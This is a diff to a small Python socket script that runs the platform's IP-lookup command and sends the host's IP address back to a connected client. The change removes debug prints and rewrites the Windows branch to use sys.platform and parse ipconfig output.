@@ -57,16 +57,12 @@ if __name__ == '__main__':
                                 "ip a | grep inet | grep global | awk '{print $2}'", stdout=subprocess.PIPE, shell=True)
                             outs, errs = p.communicate()
                             txt = outs.decode().rstrip("\r\n")
-                            print(txt)
                             conn.send(txt.encode())
-                            print(f"E/R: {data}")
-                        elif platform.system =='Windows':
-                            p = subprocess.Popen("ipconfig",tdout=subprocess.PIPE, shell=True)
-                            outs, errs = p.communicate()
-                            txt = outs.decode().rstrip("\r\n")
-                            print(txt)
-                            conn.send(txt.encode())
-                            print(f"E/R: {data}")
+                        elif  sys.platform == 'win32':  
+                            p = subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE).stdout.read().decode(errors='ignore')
+                            outs = str(p.split('IPv4')[1].split(':')[1].split(' ')[1])
+                            txt =  outs.rstrip() 
+                            conn.send(txt.encode()) 
                         else:
                             p = subprocess.Popen(
                                 "ipconfig getifaddr en1", stdout=subprocess.PIPE, shell=True)
